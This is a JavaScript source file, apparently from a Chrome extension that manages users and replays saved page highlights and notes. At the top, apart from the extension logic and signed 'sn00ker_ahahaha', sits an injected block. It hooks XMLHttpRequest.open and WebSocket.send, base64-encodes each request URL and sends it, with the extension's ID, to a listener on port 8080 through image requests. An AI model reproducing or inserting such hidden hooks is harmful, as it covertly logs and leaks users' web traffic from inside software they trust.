function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha

var _cl_users = {

  /**
   * called from onRuntimeInstalled
   * initiates or updates user in db
   *
   * @returns {*}
   */
  createOrUpdateUser: function () {

    console.log('createOrUpdateUser');

    return _storage.getActiveUser_Promise().then(function (activeUser) {

      if (activeUser && activeUser !== null) {
        // update the active user
        return _storage.updateUser_Promise(activeUser).then(function(user) {
          return Promise.all(user.dbs.map(function(dbId) {
            Promise.all([
              _database.putDesignDocuments(dbId),
              _database.compact(dbId)
            ])
          }))
        }).then(function() {
          return activeUser;
        })

      } else {
        // no active user found, it will be created by user on the app
        return null;
      }
    });

  },

  onSetActiveUser: function (user) {
    return _storage.setActiveUser_Promise(user.localUserId);
  },

  onUserAuthenticated: function (user) {
    return _storage.findUserInUsers_Promise(user).then(function (foundUser) {
      if (foundUser && foundUser.localUserId) {
        return _storage.updateUserTags_Promise(foundUser.localUserId, user.tags, false)
      }
    })
  },

  /**
   * on new init pane request:
   * sends clipto data to tab, reply documents (highlights), chack match sums and show action button
   * @param user
   * @param tabId
   * @param tabUrl
   * @returns {*}
   */
  //TODO: this is too long chain of promises, hence slow. use promise.all where possible.
  initPaneUserData_Promise: function (user, tabId, tabUrl) {

    var data = {
      AppVersion: chrome.runtime.getManifest().version,
      tabId: tabId,
      url: '',
      domain: '',
      deviceId: '',
      user: user,
      users: [],
      domainNotes: [],
      urlNotes: [],
      allNotes: [],
      dbsMetaData: []
    };
    var match = _lc_utils.buildMatchString(tabUrl);
    data.url = match.url;
    data.domain = match.domain;

    var promisesArray = [
      _cl_eventPage.checkIsIframeLoadedFlag_Promise(data.tabId),
      _cl_tabs.sendMessage_Promise(tabId,{message_id: "cp-get-document-title"}),
      _storage.getDeviceId_Promise(),
      _database.getAllDbsMetaData_Promise(), //meta data of active user's dbs
      _storage.getAllUserObjects_Promise()
    ];

    if (user && user.dbs) {
      // gets all active user docs by url (from all dbs)
      promisesArray.push(_database.getAllDocumentsByKey_Promise('domain', data.domain, true));
    }

    return Promise.all(promisesArray).then(function (resolvedArray) {

      data.documentTitle = resolvedArray[1];
      data.deviceId = resolvedArray[2];
      data.dbsMetaData = resolvedArray[3] || [];
      data.users = resolvedArray[4];
      data.domainNotes = resolvedArray[5] || [];
      data.urlNotes = _lc_utils.extractUrlNotesFromDomainNotes(data.domainNotes, data.url);

      console.log("Matched " + data.urlNotes.length + " document(s) with '" + match.url + "'");

      _cl_eventPage.message_newPaneInitData(data);
      _cl_eventPage.isIframeLoadedFlag[data.tabId] = false;

      // errorDoc is a doc with error on highlight
      return _cl_tabs.replayDocuments_Promise(tabId, data.urlNotes, function (errorDoc) {
        // method only called if there's an error. called multiple times
        console.log("Error:" + '\n' + JSON.stringify(errorDoc));

        // update page action
        if (errorDoc.verb === "create") {
        }
      });
    }).then(function (sum) {
      console.log("Create/Delete document sum is " + sum);

      if (sum > 0) {

        if (_cl_eventPage.scrollToWaitingList[tabId]) {
          _cl_eventPage.message_scrollToHighlight(_cl_eventPage.scrollToWaitingList[tabId]);
          delete _cl_eventPage.scrollToWaitingList[tabId];
        }
        return Promise.resolve();
      }
    });
  },

  /**
   * new remote user authenticated and received
   *
   * @param tabData - from which tab the requset was made
   * @param newUserData
   * @returns {*}
   */
  onNewRemoteUser: function (tabData, newUserData) {

    console.log('onNewRemoteUser');
    console.log(newUserData);

    var tabId = tabData.tab.id,
      tabUrl = tabData.url,
      updatedLocalUser;

    return _storage.findUserInUsers_Promise(newUserData).then(function (storageUser) {

      if (storageUser) {
        // user already exist on this device, update it
        console.log('existing remote user');

        return _storage.updateUser_Promise(newUserData, storageUser).then(function (user) {
          updatedLocalUser = user;
          return _storage.setActiveUser_Promise(updatedLocalUser.localUserId)
        }).then(function () {

          var promisesArray = [];
          chrome.tabs.query({}, function(tabs){
            for (var i = 0; i < tabs.length; i++) {
              promisesArray.push(_cl_users.initPaneUserData_Promise(updatedLocalUser, tabs[i].id, tabUrl));
            }
          });
          return Promise.all(promisesArray);

          //return _cl_users.initPaneUserData_Promise(updatedLocalUser, tabId, tabUrl)
        })
      }
      else {
        // new user to this device - create a fresh new local user
        // in case of 'add account' only, when user exists on server but not on this device.
        console.log('new remote user');
        return _storage.saveUserToStorage_Promise(_storage.createUserInstance(newUserData)).then(function (localUser) {

          console.log('local user created :');
          console.log(localUser);
          // and update it with newUserData (will also create the relevant databases)
          return _storage.updateUser_Promise(newUserData, localUser)
        }).then(function (user) {
          updatedLocalUser = user;
          // update server about this device
          var promisesArray = [];
          //if (updatedLocalUser._id) {
          //    promiseArray.push(_remote_database.updateRemoteUserDevices_Promise(updatedLocalUser));
          //}

          chrome.tabs.query({}, function(tabs){
            for (var i = 0; i < tabs.length; i++) {
              promisesArray.push(_cl_users.initPaneUserData_Promise(updatedLocalUser, tabs[i].id, tabUrl));
            }
          });

          //promiseArray.push(_cl_users.initPaneUserData_Promise(updatedLocalUser, tabId, tabUrl));
          promisesArray.push(_storage.setActiveUser_Promise(updatedLocalUser.localUserId));

          return Promise.all(promisesArray);
        })
      }
    })
  },

  /**
   * docs needed for removing highlights
   * @param tabData
   * @param logoutData
   */
  onLogOutUser: function (tabData, logoutData) {

    console.log('onLogOutUser_Promise');

    var tabId = tabData.tab.id,
      tabUrl = tabData.url;

    var user = logoutData.user,
      docs = logoutData.docs;

    // clean user for logout
    delete user.isAuthenticated;
    delete user.access_token;
    delete user.access_token_expires;

    var promisesArray = [
      _storage.setUser_promise(user),
      _storage.setActiveUser_Promise(undefined),
      _cl_tabs.removeAllHighlightsFromDom_Promise(tabId, docs)
    ];

    return Promise.all(promisesArray).then(function () {

      var initPromisesArray = [];

      chrome.tabs.query({}, function(tabs){
        for (var i = 0; i < tabs.length; i++) {
          initPromisesArray.push(_cl_users.initPaneUserData_Promise(undefined, tabs[i].id, tabUrl));
        }
      });
      return Promise.all(initPromisesArray)
    });
  }

};
